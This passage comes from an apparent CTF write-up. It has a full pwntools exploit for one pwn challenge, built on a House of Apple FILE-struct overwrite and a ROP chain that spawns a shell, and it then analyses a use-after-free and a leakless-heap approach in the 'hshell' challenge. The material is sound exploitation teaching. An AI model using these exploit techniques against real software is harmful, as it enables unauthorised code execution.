+    <span class="hljs-type">char</span> buf[<span class="hljs-number">128</span>];
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Entry: &quot;</span>);
+    read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">128</span>);
+}
+</code></pre>
+<p>In <code>write_entry()</code>, a read into a stack buffer is given which is within the size of the buffer.</p>
+<p>Looking at the disassembly of the function in GDB:</p>
+<pre class="hljs"><code>   0x0000000000400699 &lt;+0&gt;:     push   rbp
+   0x000000000040069a &lt;+1&gt;:     mov    rbp,rsp
+   0x000000000040069d &lt;+4&gt;:     add    rsp,0xffffffffffffff80
+   0x00000000004006a1 &lt;+8&gt;:     mov    rax,QWORD PTR [rip+0x2a08]
+   0x00000000004006a8 &lt;+15&gt;:    test   rax,rax
+   0x00000000004006ab &lt;+18&gt;:    je     0x4006be &lt;write_entry+37&gt;
+   0x00000000004006ad &lt;+20&gt;:    mov    rax,QWORD PTR [rip+0x29fc]
+   0x00000000004006b4 &lt;+27&gt;:    mov    eax,DWORD PTR [rax+0x1e0]
+   0x00000000004006ba &lt;+33&gt;:    test   eax,eax
+   0x00000000004006bc &lt;+35&gt;:    jne    0x4006ca &lt;write_entry+49&gt;
+   0x00000000004006be &lt;+37&gt;:    mov    edi,0x401545
+   0x00000000004006c3 &lt;+42&gt;:    call   0x400370 &lt;puts@plt&gt;
+   0x00000000004006c8 &lt;+47&gt;:    jmp    0x4006ef &lt;write_entry+86&gt;
+   0x00000000004006ca &lt;+49&gt;:    mov    edi,0x40154d
+   0x00000000004006cf &lt;+54&gt;:    mov    eax,0x0
+   0x00000000004006d4 &lt;+59&gt;:    call   0x400390 &lt;printf@plt&gt;
+   0x00000000004006d9 &lt;+64&gt;:    lea    rax,[rbp-0x80]
+   0x00000000004006dd &lt;+68&gt;:    mov    edx,0x80
+   0x00000000004006e2 &lt;+73&gt;:    mov    rsi,rax
+   0x00000000004006e5 &lt;+76&gt;:    mov    edi,0x0
+   0x00000000004006ea &lt;+81&gt;:    call   0x4003b0 &lt;read@plt&gt;
+   0x00000000004006ef &lt;+86&gt;:    leave
+   0x00000000004006f0 &lt;+87&gt;:    ret
+</code></pre>
+<p>The function allocates a buffer on the stack by subtracting from rsp. However, if we simply jump to 0x4006d9, we obtain a write immediately on the caller’s stack frame, which might allow us to write into the return address, as well as other stack objects:</p>
+<pre class="hljs"><code>   0x00000000004006d9 &lt;+64&gt;:    lea    rax,[rbp-0x80]
+   0x00000000004006dd &lt;+68&gt;:    mov    edx,0x80
+   0x00000000004006e2 &lt;+73&gt;:    mov    rsi,rax
+   0x00000000004006e5 &lt;+76&gt;:    mov    edi,0x0
+   0x00000000004006ea &lt;+81&gt;:    call   0x4003b0 &lt;read@plt&gt;
+</code></pre>
+<p>We can draft a simple script to partial overwrite the <code>vtable</code> field and jump to 0x4006d9 with House of Apple on fflush:</p>
+<pre class="hljs"><code><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>():
+    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)
+    p.recvuntil(<span class="hljs-string">b&#x27;Log: &#x27;</span>)
+    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(p.recvline(), <span class="hljs-number">16</span>)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>():
+    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():
+    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">change_name</span>(<span class="hljs-params">content</span>):
+    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)
+    p.sendafter(<span class="hljs-string">b&#x27;Name: &#x27;</span>, content)
+
+first = create() + <span class="hljs-number">0x100</span>
+
+fs = FileStructure()
+fs.flags = u64(<span class="hljs-string">&quot;  &quot;</span> + <span class="hljs-string">&quot;sh&quot;</span>.ljust(<span class="hljs-number">6</span>, <span class="hljs-string">&quot;\x00&quot;</span>))
+fs._IO_write_base = <span class="hljs-number">0</span>
+fs._IO_write_ptr = <span class="hljs-number">1</span>
+fs._lock = first+<span class="hljs-number">0x2d0</span><span class="hljs-comment"># Should be null</span>
+fs.chain = <span class="hljs-number">0x00000000004006d9</span> <span class="hljs-comment"># elf.sym.write_entry</span>
+fs._codecvt = first
+<span class="hljs-comment"># stderr becomes it&#x27;s own wide data vtable</span>
+<span class="hljs-comment"># Offset is so that system (fs.chain) is called</span>
+fs._wide_data = first - <span class="hljs-number">0x48</span>
+fs.vtable = <span class="hljs-number">0x7208</span> + <span class="hljs-number">0x18</span> - <span class="hljs-number">0x60</span>
+payload = <span class="hljs-built_in">bytes</span>(fs)[:-<span class="hljs-number">6</span>]
+
+change_name(<span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">0x100</span> + payload)
+free()
+</code></pre>
+<p>Now, we can look in GDB to see what stack frame we are writing into:</p>
+<pre class="hljs"><code>$rsi  0x7fffffffcbc0|+0x0000|+000: 0x00007ffff7ffd000 &lt;_rtld_local&gt;  -&gt;  0x00007ffff7ffe5f0  -&gt;  0x0000000000000000  &lt;-  $r14
+$rbp  0x7fffffffcbc8|+0x0008|+001: 0x00007fffffffcbe8  -&gt;  0x00007fffffffcc08  -&gt;  0x00007fffffffcc40  -&gt;  ...
+      0x7fffffffcbd0|+0x0010|+002: 0x00007ffff7e1e7a4 &lt;__syscall_cancel+0x14&gt;  -&gt;  0xfffff0003d48595a ('ZYH='?)  &lt;-  retaddr[1]
+      0x7fffffffcbd8|+0x0018|+003: 0x0000000000000000
+      0x7fffffffcbe0|+0x0020|+004: 0x0000003000000008
+</code></pre>
+<p>Notice that we are writing into the stack frame of <code>__internal_syscall_cancel</code>. Since we can overwrite the return address of <code>__internal_syscall_cancel</code>, we can ROP!</p>
+<p>Even so, how can we ROP? We do not exactly have very convenient gadgets such as <code>pop rdi</code> or <code>pop rsi</code>, and even if we ROP using <a href="https://sashactf.gitbook.io/pwn-notes/pwn/rop-2.34+/controlling-rbp">rbp overwrites</a>, we might not know how exactly the corrupted stack frame we have right now might affect things.</p>
+<p>Notice that at the end of <code>__internal_syscall_cancel</code>, the following is executed:</p>
+<pre class="hljs"><code>   0x00007ffff7e39984 &lt;+132&gt;:	syscall
+=&gt; 0x00007ffff7e39986 &lt;+134&gt;:	mov    rbx,QWORD PTR [rbp-0x8]
+   0x00007ffff7e3998a &lt;+138&gt;:	leave
+   0x00007ffff7e3998b &lt;+139&gt;:	ret
+</code></pre>
+<p>which moves the contents in [rbp-0x10] into the rbx register.</p>
+<p>Conveneniently, there is an add gadget:</p>
+<pre class="hljs"><code>   0x4004fc &lt;__do_global_dtors_aux+28&gt;:	add    DWORD PTR [rbp-0x3d],ebx
+   0x4004ff &lt;__do_global_dtors_aux+31&gt;:	nop
+   0x400500 &lt;__do_global_dtors_aux+32&gt;:	ret
+</code></pre>
+<p>which gives us an arbitrary add primitive. We can use this to increment a GOT entry to a one gadget, and then call the corresponding PLT to get our shell:</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep
+
+elf = context.binary = ELF(<span class="hljs-string">&quot;./chal_patched&quot;</span>)
+libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)
+context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
+context.terminal = <span class="hljs-string">&#x27;kitty&#x27;</span>
+
+p = process()
+<span class="hljs-comment"># p = remote(&quot;tcp.ybn.sg&quot;, 11135)</span>
+<span class="hljs-comment"># p = remote(&quot;localhost&quot;, 8080)</span>
+gdb.attach(p)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>():
+    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;1&#x27;</span>)
+    p.recvuntil(<span class="hljs-string">b&#x27;Log: &#x27;</span>)
+    <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>(p.recvline(), <span class="hljs-number">16</span>)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>():
+    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;5&#x27;</span>)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>():
+    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;4&#x27;</span>)
+
+<span class="hljs-keyword">def</span> <span class="hljs-title function_">change_name</span>(<span class="hljs-params">content</span>):
+    p.sendlineafter(<span class="hljs-string">b&#x27;&gt; &#x27;</span>, <span class="hljs-string">b&#x27;3&#x27;</span>)
+    p.sendafter(<span class="hljs-string">b&#x27;Name: &#x27;</span>, content)
+
+first = create() + <span class="hljs-number">0x100</span>
+
+fs = FileStructure()
+fs.flags = u64(<span class="hljs-string">&quot;  &quot;</span> + <span class="hljs-string">&quot;sh&quot;</span>.ljust(<span class="hljs-number">6</span>, <span class="hljs-string">&quot;\x00&quot;</span>))
+fs._IO_write_base = <span class="hljs-number">0</span>
+fs._IO_write_ptr = <span class="hljs-number">1</span>
+fs._lock = first+<span class="hljs-number">0x2d0</span><span class="hljs-comment"># Should be null</span>
+fs.chain = <span class="hljs-number">0x00000000004006d9</span> <span class="hljs-comment"># elf.sym.write_entry</span>
+fs._codecvt = first
+<span class="hljs-comment"># stderr becomes it&#x27;s own wide data vtable</span>
+<span class="hljs-comment"># Offset is so that system (fs.chain) is called</span>
+fs._wide_data = first - <span class="hljs-number">0x48</span>
+fs.vtable = <span class="hljs-number">0x2208</span> + <span class="hljs-number">0x18</span> - <span class="hljs-number">0x60</span>
+payload = <span class="hljs-built_in">bytes</span>(fs)[:-<span class="hljs-number">6</span>]
+
+change_name(<span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">0x100</span> + payload)
+free()
+
+pause()
+
+rop = ROP(elf)
+rop.raw(<span class="hljs-number">0x64c5f</span>)            <span class="hljs-comment"># because of mov rbx, [rbp-0x8] in __internal_syscall_cancel</span>
+rop.raw(elf.got.fflush + <span class="hljs-number">0x3d</span>) <span class="hljs-comment"># rbp</span>
+rop.raw(<span class="hljs-number">0x00000000004004fc</span>) <span class="hljs-comment"># add [rbp - 0x3d], ebx; nop; ret</span>
+rop.raw(elf.plt.fflush)
+
+p.send(rop.chain())
+sleep(<span class="hljs-number">0.2</span>)
+p.sendline(<span class="hljs-string">b&#x27;cat flag.txt&#x27;</span>)
+
+p.interactive()
+</code></pre>
+<h1 id="pwn%2Fhshell"tabindex="-1">pwn/hshell</h1>
+<h2 id="challenge-protections-4"tabindex="-1">Challenge Protections</h2>
+<pre class="hljs"><code>[*] '/home/nikolawinata/Documents/ctf/ybn25/hshell/solution/main'
+    Arch:       amd64-64-little
+    RELRO:      Full RELRO
+    Stack:      No canary found
+    NX:         NX enabled
+    PIE:        PIE enabled
+    Stripped:   No
+    Debuginfo:  Yes
+</code></pre>
+<h2 id="challenge-4"tabindex="-1">Challenge</h2>
+<p>The binary is a program that emulates a shell with a basic variable setting function:</p>
+<pre class="hljs"><code><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span>
+<span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span>
+
+<span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">Type</span> {</span>
+	NUMBER,
+	STRING
+};
+
+<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Variable</span> {</span>
+	<span class="hljs-class"><span class="hljs-keyword">union</span> {</span>
+		<span class="hljs-type">long</span> num;
+		<span class="hljs-type">char</span>* buf;
+	} val;
+	<span class="hljs-type">size_t</span> size;
+	<span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">Type</span> <span class="hljs-title">type</span>;</span>
+	<span class="hljs-type">char</span>* name;
+} Variable;
+
+Variable *variables[<span class="hljs-number">0x1000</span>];
+<span class="hljs-type">char</span> *strings[<span class="hljs-number">0x1000</span>];
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">print_var</span><span class="hljs-params">(Variable* value)</span> {
+	<span class="hljs-keyword">switch</span> (value-&gt;type) {
+		<span class="hljs-keyword">case</span> NUMBER: <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%ld\n&quot;</span>, value-&gt;val.num); <span class="hljs-keyword">break</span>;
+		<span class="hljs-keyword">case</span> STRING: <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, value-&gt;val.buf); <span class="hljs-keyword">break</span>;
+		<span class="hljs-keyword">default</span>: _exit(<span class="hljs-number">1</span>);
+	}
+}
+
+<span class="hljs-type">uint64_t</span> <span class="hljs-title function_">hash_str</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s)</span> {
+	<span class="hljs-type">uint64_t</span> hash = <span class="hljs-number">0xcbf29ce484222325</span>ULL;
+	<span class="hljs-keyword">while</span> (*s) {
+		hash ^= (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>)*s++;
+		hash *= <span class="hljs-number">0x100000001b3</span>ULL;
+	}
+	<span class="hljs-keyword">return</span> hash;
+}
+
+Variable *<span class="hljs-title function_">new_string_var</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s)</span> {
+	Variable *v = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Variable));
+	<span class="hljs-keyword">if</span> (!v) _exit(<span class="hljs-number">1</span>);
+
+	v-&gt;type = STRING;
+	v-&gt;name = <span class="hljs-literal">NULL</span>;
+
+	<span class="hljs-type">size_t</span> idx = (<span class="hljs-type">size_t</span>)hash_str(s) % <span class="hljs-number">0xfff</span>;
+	<span class="hljs-keyword">if</span> (strings[idx]) {
+		v-&gt;val.buf = strings[idx]; <span class="hljs-comment">// string interning!</span>
+	} <span class="hljs-keyword">else</span> {
+		v-&gt;val.buf = strdup(s);
+		strings[idx] = v-&gt;val.buf;
+	}
+	<span class="hljs-keyword">if</span> (!v-&gt;val.buf) _exit(<span class="hljs-number">1</span>);
+	v-&gt;size = <span class="hljs-built_in">strlen</span>(v-&gt;val.buf);
+
+	<span class="hljs-keyword">return</span> v;
+}
+
+Variable *<span class="hljs-title function_">new_number_var</span><span class="hljs-params">(<span class="hljs-type">long</span> n)</span> {
+	Variable *v = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Variable));
+	<span class="hljs-keyword">if</span> (!v) _exit(<span class="hljs-number">1</span>);
+
+	v-&gt;type = NUMBER;
+	v-&gt;name = <span class="hljs-literal">NULL</span>;
+	v-&gt;val.num = n;
+	v-&gt;size = <span class="hljs-number">0</span>;
+
+	<span class="hljs-keyword">return</span> v;
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">free_var</span><span class="hljs-params">(Variable *var)</span> {
+	<span class="hljs-keyword">if</span> (var-&gt;type == STRING) <span class="hljs-built_in">free</span>(var-&gt;val.buf);
+	<span class="hljs-built_in">free</span>(var-&gt;name);
+	<span class="hljs-built_in">free</span>(var);
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">set_var</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* name, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* p)</span> {
+	<span class="hljs-type">char</span> *strval;
+	<span class="hljs-type">long</span> longval = strtol(p+<span class="hljs-number">1</span>, &amp;strval, <span class="hljs-number">10</span>);
+	Variable *var;
+
+	<span class="hljs-type">size_t</span> idx = (<span class="hljs-type">size_t</span>)hash_str(name) % <span class="hljs-number">0xfff</span>;
+
+	<span class="hljs-keyword">if</span> (variables[idx]) {
+		free_var(variables[idx]);
+		variables[idx] = <span class="hljs-literal">NULL</span>;
+	}
+	
+	<span class="hljs-keyword">if</span> (*strval) {
+		var = new_string_var(p+<span class="hljs-number">1</span>);
+		var-&gt;name = strdup(name);
+	} <span class="hljs-keyword">else</span> {
+		var = new_number_var(longval);
+		var-&gt;name = strdup(name);
+	}
+	variables[idx] = var;
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">modify_var</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* name, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* p)</span> {
+	<span class="hljs-type">char</span> *strval;
+	<span class="hljs-type">long</span> longval = strtol(p+<span class="hljs-number">1</span>, &amp;strval, <span class="hljs-number">10</span>);
+	<span class="hljs-type">size_t</span> idx = (<span class="hljs-type">size_t</span>)hash_str(name) % <span class="hljs-number">0xfff</span>;
+	<span class="hljs-type">size_t</span> len;
+	Variable *var;
+
+	<span class="hljs-keyword">if</span> (!(variables[idx])) <span class="hljs-keyword">return</span>;
+	var = variables[idx];
+
+	<span class="hljs-keyword">if</span> (*strval) {
+		<span class="hljs-type">size_t</span> len = <span class="hljs-built_in">strlen</span>(p+<span class="hljs-number">1</span>);
+		<span class="hljs-built_in">memcpy</span>(var-&gt;val.buf, p+<span class="hljs-number">1</span>, (len &gt; var-&gt;size) ? var-&gt;size : len);
+	} <span class="hljs-keyword">else</span> {
+		var-&gt;val.num = longval;
+	}
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">hint</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* name)</span> {
+	<span class="hljs-type">char</span> *p = <span class="hljs-built_in">strchr</span>(name, <span class="hljs-string">&#x27;)&#x27;</span>);
+	*p = <span class="hljs-number">0</span>;
+
+	Variable *var;
+	<span class="hljs-type">size_t</span> idx = (<span class="hljs-type">size_t</span>)hash_str(name) % <span class="hljs-number">0xfff</span>;
+	<span class="hljs-keyword">if</span> (!(variables[idx])) <span class="hljs-keyword">return</span>;
+	var = variables[idx];
+
+	<span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s: %ld\n&quot;</span>, name, ((<span class="hljs-type">long</span>)var-&gt;val.num &gt;&gt; <span class="hljs-number">12</span>) &amp; <span class="hljs-number">0xf</span>);
+}
+
+<span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> {
+	setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>, _IONBF, <span class="hljs-number">0</span>);
+
+	<span class="hljs-type">char</span> cmd[<span class="hljs-number">4096</span>];
+	<span class="hljs-type">char</span> *p;
+	<span class="hljs-type">int</span> hints = <span class="hljs-number">0</span>;
+	<span class="hljs-keyword">while</span> (<span class="hljs-number">1</span>) {
+		<span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;&gt; &quot;</span>);
+		fgets(cmd, <span class="hljs-keyword">sizeof</span>(cmd), <span class="hljs-built_in">stdin</span>);
+		
+		<span class="hljs-keyword">if</span> (<span class="hljs-built_in">strchr</span>(cmd, <span class="hljs-string">&#x27;\n&#x27;</span>))
+			cmd[<span class="hljs-built_in">strcspn</span>(cmd, <span class="hljs-string">&quot;\n&quot;</span>)] = <span class="hljs-string">&#x27;\0&#x27;</span>;
+		
+		<span class="hljs-keyword">if</span> (cmd[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;$&#x27;</span>) {
+			p = <span class="hljs-built_in">strchr</span>(cmd, <span class="hljs-string">&#x27;*&#x27;</span>);
+			<span class="hljs-keyword">if</span> (p) {
+				*p = <span class="hljs-number">0</span>;
+				p += <span class="hljs-number">1</span>;
+				<span class="hljs-keyword">if</span> (*p == <span class="hljs-string">&#x27;=&#x27;</span>) {
+					*p = <span class="hljs-number">0</span>;
+					modify_var(cmd+<span class="hljs-number">1</span>, p);
+				} 
+			}
+			p = <span class="hljs-built_in">strchr</span>(cmd, <span class="hljs-string">&#x27;=&#x27;</span>);
+			<span class="hljs-keyword">if</span> (p) {
+				*p = <span class="hljs-number">0</span>;
+				set_var(cmd+<span class="hljs-number">1</span>, p);
+			}
+		}
+
+		<span class="hljs-keyword">if</span> (!<span class="hljs-built_in">strncmp</span>(cmd, <span class="hljs-string">&quot;hint(&quot;</span>, <span class="hljs-number">5</span>)) {
+			<span class="hljs-keyword">if</span> (hints &gt; <span class="hljs-number">0</span>) <span class="hljs-keyword">continue</span>;	
+			p = <span class="hljs-built_in">strchr</span>(cmd, <span class="hljs-string">&#x27;(&#x27;</span>);
+			hint(p+<span class="hljs-number">1</span>);
+		}
+	}
+}
+</code></pre>
+<p>Variables can either have a long value or a string value. The name of the variable is first hashed (modulo the size of the <code>variable</code> pointer array), and then a pointer to the variable object is stored at the respective index of the <code>variable</code> array.</p>
+<p>Curiously enough, there is a “string interning” feature that allows variables to share references to the same string if they are initialised with the same string value. This is done by storing pointers to strings by their hashed index in the <code>strings</code> pointer array.</p>
+<p>Notably, there is also a <code>hint()</code> functionality that leaks the fourth nibble of the variable’s <code>val</code> field.</p>
+<p>We are <strong>not able to view the value of a variable after setting it</strong>, making this a “leakless heap” challenge.</p>
+<h2 id="challenge-analysis-2"tabindex="-1">Challenge Analysis</h2>
+<p>When variables are initialised, they are stored as objects on the heap:</p>
+<pre class="hljs"><code><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">Type</span> {</span>
+	NUMBER,
+	STRING
+};
+
+<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">Variable</span> {</span>
+	<span class="hljs-class"><span class="hljs-keyword">union</span> {</span>
+		<span class="hljs-type">long</span> num;
+		<span class="hljs-type">char</span>* buf;
+	} val;
+	<span class="hljs-type">size_t</span> size;
+	<span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">Type</span> <span class="hljs-title">type</span>;</span>
+	<span class="hljs-type">char</span>* name;
+} Variable;
+
+Variable *<span class="hljs-title function_">new_string_var</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *s)</span> {
+	Variable *v = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Variable));
+	<span class="hljs-keyword">if</span> (!v) _exit(<span class="hljs-number">1</span>);
+
+	v-&gt;type = STRING;
+	v-&gt;name = <span class="hljs-literal">NULL</span>;
+
+	<span class="hljs-type">size_t</span> idx = (<span class="hljs-type">size_t</span>)hash_str(s) % <span class="hljs-number">0xfff</span>;
+	<span class="hljs-keyword">if</span> (strings[idx]) {
+		v-&gt;val.buf = strings[idx]; <span class="hljs-comment">// string interning!</span>
+	} <span class="hljs-keyword">else</span> {
+		v-&gt;val.buf = strdup(s);
+		strings[idx] = v-&gt;val.buf;
+	}
+	<span class="hljs-keyword">if</span> (!v-&gt;val.buf) _exit(<span class="hljs-number">1</span>);
+	v-&gt;size = <span class="hljs-built_in">strlen</span>(v-&gt;val.buf);
+
+	<span class="hljs-keyword">return</span> v;
+}
+
+Variable *<span class="hljs-title function_">new_number_var</span><span class="hljs-params">(<span class="hljs-type">long</span> n)</span> {
+	Variable *v = <span class="hljs-built_in">malloc</span>(<span class="hljs-keyword">sizeof</span>(Variable));
+	<span class="hljs-keyword">if</span> (!v) _exit(<span class="hljs-number">1</span>);
+
+	v-&gt;type = NUMBER;
+	v-&gt;name = <span class="hljs-literal">NULL</span>;
+	v-&gt;val.num = n;
+	v-&gt;size = <span class="hljs-number">0</span>;
+
+	<span class="hljs-keyword">return</span> v;
+}
+
+<span class="hljs-type">void</span> <span class="hljs-title function_">set_var</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span>* name, <span class="hljs-type">const</span> <span class="hljs-type">char</span>* p)</span> {
+	<span class="hljs-type">char</span> *strval;
+	<span class="hljs-type">long</span> longval = strtol(p+<span class="hljs-number">1</span>, &amp;strval, <span class="hljs-number">10</span>);
+	Variable *var;
+
+	<span class="hljs-type">size_t</span> idx = (<span class="hljs-type">size_t</span>)hash_str(name) % <span class="hljs-number">0xfff</span>;
+
+	<span class="hljs-keyword">if</span> (variables[idx]) {
+		free_var(variables[idx]);
+		variables[idx] = <span class="hljs-literal">NULL</span>;
+	}
+	
+	<span class="hljs-keyword">if</span> (*strval) {
+		var = new_string_var(p+<span class="hljs-number">1</span>);
+		var-&gt;name = strdup(name);
+	} <span class="hljs-keyword">else</span> {
+		var = new_number_var(longval);
+		var-&gt;name = strdup(name);
+	}
+	variables[idx] = var;
+}
+</code></pre>
+<p>There are three chunks allocated for one string variable:</p>
+<ol>
+<li>The variable’s metadata object</li>
+<li>A separate chunk allocated for the string, via <code>strdup()</code>, notably with the size <code>strlen(s)+1</code>, where <code>s</code> is the string.</li>
+<li>A separate chunk allocated for the name of the variable via <code>strdup()</code>.</li>
+</ol>
+<p>When a variable of the same name (or hash) is set, the program frees the initial variable object, and then allocates yet another object for the new variable and stores it at the respective index.</p>
+<p>There is also notably a modify value function, which writes to the buf pointer of a variable object.</p>
+<h2 id="challenge-analysis-3"tabindex="-1">Challenge Analysis</h2>
+<h3 id="use-after-free-(uaf)-vulnerability"tabindex="-1">Use-After-Free (UAF) Vulnerability</h3>
+<p>Taking a closer look at the program, there are two suspicious features implemented:</p>
+<ol>
+<li>String interning, which allows variables to share string pointers</li>
+<li>Variable name reuse, which frees the initial variable object.</li>
+</ol>
+<p>Now consider the following actions:</p>
+<pre class="hljs"><code>&gt; $var=AA
+&gt; $var=AA
+</code></pre>
+<p>Tracing the code of the program, on the second initialisation of the variable of the same name, notice that:</p>
+<ol>
+<li>In <code>set_var()</code>, the program detects that there is already an existing variable with the same name. Hence, this variable object is freed. However, <strong>the string pointer remains in the intern array</strong></li>
+<li><code>set_var()</code> calls <code>new_string_var()</code>. In <code>new_string_var()</code>, the program detects that the exact string has already been interned. Hence, it reuses the string pointer for the variable’s buf pointer.</li>
+</ol>
+<p>This gives us a clean dangling reference in our variable pointing to a freed string chunk. If we sized our string appropriately to match the size of a variable metadata object, we effectively have write on the metadata of another variable in our heap, allowing us to modify the buf pointer to point to an arbitrary address. This gives us, in theory, an arbitrary write.</p>
+<p><img src="/images/hshell.001.jpeg"alt="initial"loading="lazy"decoding="async"width="1920"height="1080"> 	
+<img src="/images/hshell.002.jpeg"alt="uaf"loading="lazy"decoding="async"width="1920"height="1080"> 	
+<img src="/images/hshell.003.jpeg"alt="reclaim"loading="lazy"decoding="async"width="1920"height="1080"></p>
+<p>However, we aren’t able to leak any heap values. Furthermore, the binary is PIE-enabled, meaning we won’t be able to point the buf pointer to any notable addresses in the ELF section as well. What, then?</p>
+<h3 id="leakless-heap"tabindex="-1">Leakless Heap</h3>
+<p>The name “leakless heap” is a misnomer - this is because the first goal of leakless heap is to be able to induce a leak.</p>
+<p>This is commonly done by being able to induce a write onto the stdout file struct, which LIBC IO functions commonly use to write out content to the terminal.</p>
+<p>While we have no knowledge of either PIE base, heap base or libc base, if there are existing pointers in the buf field of the victim metadata object, we can still partial overwrite the pointer to point to where we want it to within the memory region (without bruteforcing because of <code>hint()</code>!)</p>
+<p>As the saying goes: if you can’t lead a horse to water, you can instead lead the water to the horse:</p>
+<p><img src="/images/hshell45.001.jpeg"alt="horsetowater"loading="lazy"decoding="async"width="1920"height="1080">
+<img src="/images/hshell45.002.jpeg"alt="watertohorse"loading="lazy"decoding="async"width="1920"height="1080"></p>
+<p>Hence, in order to get a write onto the stdout file struct which resides in the libc memory region, we will first need to get a libc pointer into the buf field.</p>
+<h3 id="overlapping-chunks-and-remaindering"tabindex="-1">Overlapping Chunks and Remaindering</h3>
+<p>When chunks are inserted into the unsorted bin, what is primarily useful is the fact that the first 0x10 bytes are overwritten with pointers that point back to the <code>main_arena</code> of libc: which are libc pointers.</p>
+<p>When chunks smaller than the size of the unsorted bin chunk are allocated, they are “broken away” from the top of the unsorted chunk in a process in what’s known as “remaindering”.</p>
+<p>When this happens, the new top of the remaining unsorted chunk is calculated as the old top plus the size of the chunk just allocated. The <code>main_arena</code> pointers are then written to first 0x10 bytes of the new top.</p>
+<p>This is especially useful in the context of the challenge when we can achieve <strong>overlapping chunks</strong>. This is because we can forge a chunk size header on one of the higher chunks to be <strong>larger than it actually is</strong>, overlapping the other variable object chunks.</p>
+<p>Now, when we free the chunk with the forged size header, GLIBC thinks the chunk is larger than it actually is and inserts it into the unsorted bin, writing the <code>main_arena</code> pointers to the top of the chunk.</p>
+<p>Then, we can leverage remaindering to gradually “push” the <code>main_arena</code> libc pointers into a variable metadata chunk, where a libc pointer will be in the buf field of a metadata object we control. We can hence use our dangling reference to partial overwrite this address to point to stdout, giving us our write onto the file struct.</p>
+<p>Hence, our plan is as such:</p>
+<ol>
+<li>Spray the heap with a few string variable objects, with the same string length as the size of a variable metadata chunk. This gives us a large enough heap to fake an unsorted chunk.</li>
+<li>Trigger our dangling reference vulnerability and reclaim the freed string chunk with a variable metadata chunk. This will be our victim object.</li>
+<li>Partial overwrite the buf pointer in the victim variable object to point to a chunk size header of one of the higher chunks and overwrite the size to overlap the other variable objects as well as match the unsorted bin chunk size.</li>
